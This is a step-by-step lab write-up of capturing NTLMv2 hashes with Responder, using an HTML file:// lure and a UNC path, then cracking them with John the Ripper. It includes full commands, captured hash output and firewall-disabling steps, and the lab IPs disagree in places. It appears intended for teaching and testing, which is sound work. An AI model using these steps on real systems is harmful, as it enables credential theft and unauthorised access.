# Attack Execution Guide

## Complete Step-by-Step Walkthrough

---

## Phase 1: Lab Setup

### Network Configuration

**Kali Linux (Attacker):**

**For Windows 10 VM Testing:**
```bash
# VirtualBox Settings → Network → Adapter 1
Attached to: Host-only Adapter
Name: vboxnet0

# Resulting IP
IP Address: 192.168.56.101
Subnet: 255.255.255.0
```

**For Windows 11 PC Testing:**
```bash
# VirtualBox Settings → Network → Adapter 1
Attached to: Bridged Adapter
Name: Intel(R) Wireless-AC 9560 160MHz

# Resulting IP
IP Address: 192.168.1.117
Subnet: 255.255.255.0
Gateway: 192.168.1.1
```

---

**Windows 10 VM (Target):**
```bash
# VirtualBox Settings → Network → Adapter 1
Attached to: Host-only Adapter
Name: vboxnet0

# IP Configuration
IP Address: 192.168.56.104
Subnet: 255.255.255.0
```

---

**Windows 11 PC (Real System):**
```bash
# Home network (WiFi)
IP Address: 192.168.1.178
Subnet: 255.255.255.0
Gateway: 192.168.1.1 (router)
```

---

## Phase 2: Start Responder

**On Kali Linux:**
```bash
# Navigate to home
cd ~

# Start Responder with verbose output
sudo responder -I eth0 -wv
```

**Expected Output:**
```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    
[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    SMB server                 [ON]
    
[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.56.10]
    
[+] Listening for events...
```

**Leave this running!**

---

## Phase 3: Create Attack Vector

**On Windows Target - Create test.html:**

**Method 1: Notepad**
1. Open Notepad
2. Paste this code:
```html
<!DOCTYPE html>
<html>
<body>
    <p><a href="file://192.168.56.10/test">click me</a></p>
</body>
</html>
```

3. File → Save As
4. File name: `test.html`
5. Save as type: **All Files**
6. Save to: Desktop

---

## Phase 4: Execute Attack

### Method A: HTML File (Browser - Often Blocked)

**On Windows Target:**
1. Double-click `test.html`
2. Browser opens
3. Click "click me" link

**Result:** 
- Modern browsers (Edge/Chrome) block remote file:// links
- Attack may fail

---

### Method B: File Explorer (Direct - Always Works)

**On Windows Target:**
1. Press `Windows + E` (open File Explorer)
2. Click address bar
3. Type: `\\192.168.56.101\test`
4. Press Enter

**Result:**
- Windows attempts SMB connection
- Sends NTLM authentication
- Hash captured! ✅

---

## Phase 5: Hash Capture

**Check Kali Terminal (Responder):**

**Successful Capture Output:**
```
[SMB] NTLMv2-SSP Client   : 192.168.56.104
[SMB] NTLMv2-SSP Username : DESKTOP-LTPSFD0\LAB
[SMB] NTLMv2-SSP Hash     : LAB::DESKTOP-LTPSFD0:192444b9ab45b51f:A83A5F7280C524562DF9D9F246364924:0101000000000000007FA1FFC0AEDC019194DA034553488C...
```

**Hash also saved to:**
```
/usr/share/responder/logs/SMB-NTLMSSPv2-192.168.56.104.txt
```

---

## Phase 6: Extract Hash

**On Kali:**
```bash
# Create hash file
nano exploit.txt

# Paste ONLY the hash line (starting with username):
LAB::DESKTOP-LTPSFD0:192444b9ab45b51f:A83A5F7280C524562DF9D9F246364924:0101000000000000007FA1FFC0AEDC019194DA034553488C...

# Save: Ctrl+O, Enter, Ctrl+X
```

**IMPORTANT:** Copy the ENTIRE hash line, not just part of it!

---

## Phase 7: Password Cracking

### Attempt 1: Generic Wordlist
```bash
# Try rockyou.txt
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt exploit.txt
```

**Result for password `1414`:**
```
Session completed.
0 password hashes cracked, 1 left
```

**Failed!** Password not in rockyou.txt

---

### Attempt 2: Custom Wordlist

**Create targeted wordlist:**
```bash
# Create custom wordlist
echo "1414" > passwords.txt
echo "4141" >> passwords.txt
echo "0114" >> passwords.txt
```

**Crack with custom wordlist:**
```bash
john --format=netntlmv2 --wordlist=passwords.txt exploit.txt
```

**Result:**
```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
1414             (LAB)
Session completed.
```

**Success!** ✅

---

## Phase 8: Verify Results

**Show cracked password:**
```bash
john --show --format=netntlmv2 exploit.txt
```

**Output:**
```
LAB:1414

1 password hash cracked, 0 left
```

---

## Challenges Encountered

### Challenge 1: Windows 11 Firewall

**Problem:**
```bash
# On Kali, tried to ping Windows 11
ping 192.168.1.178

# Result:
Request timeout
```

**Connection failed, Responder received nothing.**

**Solution:**
1. On Windows 11: Windows Security → Firewall & network protection
2. Turn off: Private network, Public network
3. Retry attack
4. **Success!** Connection worked

**After testing:** Re-enabled firewall

---

### Challenge 2: Wrong Password from John

**Problem:**
- Windows 10 VM password: `nwigwecj1`
- John showed: `12Honey`
- `12Honey` was NOT the correct password!

**Cause:**
- Old hash cached in `~/.john/john.pot`
- Previous test session

**Solution:**
```bash
# Changed Windows 10 VM password to 1414
# Captured fresh hash
# Created custom wordlist
# Cracked successfully
```

---

### Challenge 3: Manual Credential Prompt

**On Windows 11:**
- File Explorer prompted: "Enter network credentials"
- Had to manually type username and password

**Behavior:**
- Not silent automatic authentication
- User interaction required
- Hash still captured when credentials entered

---

## Attack Success Summary

**Windows 10 VM:**
- ✅ Hash captured via File Explorer
- ✅ Password cracked with custom wordlist
- ⏱️ Crack time: <1 second
- 🔑 Password: 1414

**Windows 11 PC:**
- ✅ Hash captured after disabling firewall
- ✅ Credentials manually entered
- ✅ Password cracked
- 🔑 Password: 1414

---

## Key Lessons

1. **Firewall is essential** - Default protection works
2. **Custom wordlists effective** - OSINT-driven attacks succeed
3. **Short passwords unsafe** - 4 digits = instant crack
4. **User interaction matters** - Modern security requires user action
5. **Testing methodology** - Document challenges, not just successes

---

